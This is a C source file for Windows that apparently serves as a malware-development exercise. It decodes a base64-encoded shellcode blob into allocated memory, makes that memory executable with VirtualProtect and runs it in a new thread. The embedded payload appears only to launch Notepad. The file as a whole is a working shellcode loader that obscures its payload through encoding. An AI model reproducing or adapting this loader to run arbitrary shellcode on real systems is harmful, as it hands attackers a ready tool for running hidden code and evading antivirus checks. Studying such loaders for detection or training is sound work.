#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

unsigned char base64_payload[] = 
"/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHA"
"rDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhE"
"i0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhE"
"i0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhB"
"WVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/"
"1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/Vbm90ZXBhZC5leGUA";

unsigned int base64_payload_len = sizeof(base64_payload);

// Decodes Base64 Payload To Binary And Copies To Allocated Memory
int DecodeBase64andCopyToAllocMemory( const BYTE * base64_source, unsigned int sourceLength, char * allocated_mem, unsigned int destinationLength ) {

	DWORD outputLength;
	BOOL cryptResult;

	outputLength = destinationLength;
	cryptResult = CryptStringToBinary( (LPCSTR) base64_source, sourceLength, CRYPT_STRING_BASE64, (BYTE * )allocated_mem, &outputLength, NULL, NULL);
	
	if (!cryptResult) outputLength = 0;  // failed
	
	return( outputLength );
}


int main(void) {
    
	void * alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
    DWORD oldprotect = 0;
	
	// Allocate new memory buffer for payload
	alloc_mem = VirtualAlloc(0, base64_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "base64_payload addr", (void *)base64_payload);
	printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void *)alloc_mem);

	printf("\n[1] Press Enter to DecodeBase64andCopyToAllocatedMemory\n");
	getchar();

	// Decodes Base64 Payload To Binary And Copies To Allocated Memory
	DecodeBase64andCopyToAllocMemory((const BYTE *)base64_payload, base64_payload_len, (char *) alloc_mem, base64_payload_len);
	
	// Set the newly allocated memory to be executable
	retval = VirtualProtect(alloc_mem, base64_payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\n[2] Press Enter to Create Thread\n");
	getchar();

	// If VirtualProtect succeeded, run the thread that contains the shellcodePayload
	if ( retval != 0 ) {
			threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
			WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}
